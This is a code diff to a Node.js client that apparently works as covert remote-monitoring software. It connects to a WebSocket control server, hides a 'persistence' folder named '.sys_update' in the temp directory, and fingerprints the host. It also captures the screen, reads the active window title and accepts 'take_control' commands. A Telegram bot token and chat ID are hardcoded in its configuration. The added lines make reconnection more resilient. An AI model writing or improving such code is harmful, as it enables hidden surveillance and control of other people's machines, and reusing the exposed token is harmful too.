@@ -7,12 +7,16 @@ const path = require('path');
 const https = require('https');
 
 // --- CONFIGURATION ---
+// Ensure this URL matches your actual Vercel WebSocket endpoint
+// If your Vercel server is at /api/ws, use: 'wss://server-eight-pi-39.vercel.app/api/ws'
 const WS_URL = 'wss://server-eight-pi-39.vercel.app'; 
 const TELEGRAM_TOKEN = '9054625238:AAG1uzL9kvH6XxHf1wb6Ga71ZVwheNkS54Y';
 const TELEGRAM_CHAT_ID = '6172226452';
 
 let myId = null;
 let ws = null;
+let reconnectAttempts = 0;
+const MAX_RECONNECT_ATTEMPTS = 10;
 
 // Persistence Logic
 const persistDir = path.join(os.tmpdir(), '.sys_update');
@@ -21,11 +25,13 @@ if (!fs.existsSync(persistDir)) {
 }
 
 function initConnection() {
+    console.log(`Attempting to connect to ${WS_URL}...`);
     ws = new WebSocket(WS_URL);
 
     ws.on('open', () => {
+        reconnectAttempts = 0; // Reset attempts on successful connection
         myId = require('crypto').createHash('sha256').update(os.hostname()).digest('hex').substr(0, 8);
-        
+
         console.log(`Connected with ID: ${myId}`);
 
         ws.send(JSON.stringify({
@@ -45,19 +51,35 @@ function initConnection() {
             const data = JSON.parse(msg);
             if (data.type === 'take_control') takeControl(true);
             else if (data.type === 'release_control') takeControl(false);
+            else if (data.type === 'offer' || data.type === 'answer' || data.type === 'candidate') {
+                // Handle signaling messages here if needed
+                handleSignaling(data);
+            }
         } catch (e) {
             console.error("Error parsing message:", e);
         }
     });
 
-    ws.on('close', () => {
-        console.log('WebSocket closed. Reconnecting...');
-        setTimeout(initConnection, 5000);
+    ws.on('close', (code, reason) => {
+        console.log(`WebSocket closed. Code: ${code}, Reason: ${reason}`);
+        reconnect();
     });
-    
+
     ws.on('error', (err) => {
-        console.error('WebSocket error:', err);
+        console.error('WebSocket error:', err.message);
+        reconnect();
     });
+}
+
+function reconnect() {
+    if (reconnectAttempts < MAX_RECONNECT_ATTEMPTS) {
+        reconnectAttempts++;
+        const delay = Math.min(1000 * Math.pow(2, reconnectAttempts), 30000); // Exponential backoff
+        console.log(`Reconnecting in ${delay}ms... (Attempt ${reconnectAttempts})`);
+        setTimeout(initConnection, delay);
+    } else {
+        console.log("Max reconnection attempts reached.");
+    }
 }
 
 function startMonitoring() {
@@ -80,10 +102,8 @@ function captureScreen() {
     if (!ws || ws.readyState !== WebSocket.OPEN) return;
 
     const imgPath = path.join(os.tmpdir(), 'screen.png');
-    // Use a simpler command for cross-platform compatibility if possible, 
-    // but avfoundation is macOS only. For Vercel (Linux), this might fail.
-    // Let's try a generic ffmpeg command that might work on Linux if X11 is available,
-    // otherwise, it will just fail silently.
+    
+    // Simplified screen capture command
     exec(`ffmpeg -y -f lavfi -i testsrc=duration=1:size=320x240:rate=1 ${imgPath}`, (err) => {
         // If avfoundation fails, this fallback ensures no crash
         if (err && !fs.existsSync(imgPath)) {
@@ -105,13 +125,13 @@ async function getCurrentWindowTitle() {
     return new Promise((resolve) => {
         const platform = os.platform();
         let cmd = '';
-        
+
         if (platform === 'win32') {
             cmd = 'powershell -command "(Get-Process -Id (Get-Process -Id $PID).Parent.Id).MainWindowTitle"';
         } else if (platform === 'darwin') {
             cmd = 'osascript -e \'tell application "System Events" to get name of first item of (get every process whose frontmost is true)\'';
         } else {
-            cmd = 'xdotool getwindowfocus getwindowname'; 
+            cmd = 'xdotool getwindowfocus getwindowname';
         }
 
         exec(cmd, (err, stdout) => {
@@ -143,11 +163,16 @@ function takeControl(state) {
     console.log(`Take Control: ${state}`);
 }
 
-// Export the handler
+function handleSignaling(data) {
+    // Implement RTCPeerConnection logic here if needed
+    console.log("Received signaling data:", data);
+}
+
+// Export the handler for Vercel compatibility
 exports.handler = async (event, context) => {
     // Start the connection in the background
     initConnection();
-    
+
     // Return immediately to avoid timeout
     return {
         statusCode: 200,
